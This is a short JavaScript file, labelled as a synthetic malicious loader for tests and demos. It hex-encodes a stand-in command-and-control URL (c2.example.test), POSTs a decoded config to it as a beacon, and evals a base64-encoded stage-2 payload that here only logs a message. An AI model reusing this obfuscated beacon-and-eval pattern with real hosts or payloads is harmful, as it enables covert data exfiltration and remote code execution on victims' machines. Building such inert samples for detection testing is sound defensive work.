// Synthetic malicious loader used for end-to-end tests and demos.
// Stage 1: decode a URL from a string array, beacon it, then eval a stage-2 payload.
(function () {
  var _0xa1b2 = [
    '\x68\x74\x74\x70\x73\x3a\x2f\x2f',
    'c2',
    '\x2e\x65\x78\x61\x6d\x70\x6c\x65',
    '\x2e\x74\x65\x73\x74',
    '/gate.php?k='
  ];
  function _0xdec(i) { return _0xa1b2[i]; }
  var endpoint = _0xdec(0) + _0xdec(1) + _0xdec(2) + _0xdec(3) + _0xdec(4) + btoa('victim-1');
  var cfg = atob('eyJjMiI6Imh0dHBzOi8vYzIuZXhhbXBsZS50ZXN0L2JlYWNvbiIsImtleSI6IjRmMTkifQ==');
  console.log('config', cfg);
  try {
    fetch(endpoint, { method: 'POST', body: cfg });
  } catch (e) {
    console.log('network failed', e.message);
  }
  var stage2 = atob('KGZ1bmN0aW9uKCl7IHZhciBzID0gJ3N0YWdlLTIgZXhlY3V0ZWQnOyBjb25zb2xlLmxvZyhzKTsgfSkoKQ==');
  eval(stage2);
  localStorage.setItem('cfg', cfg);
  setTimeout(function () { console.log('beacon retry'); }, 1000);
})();
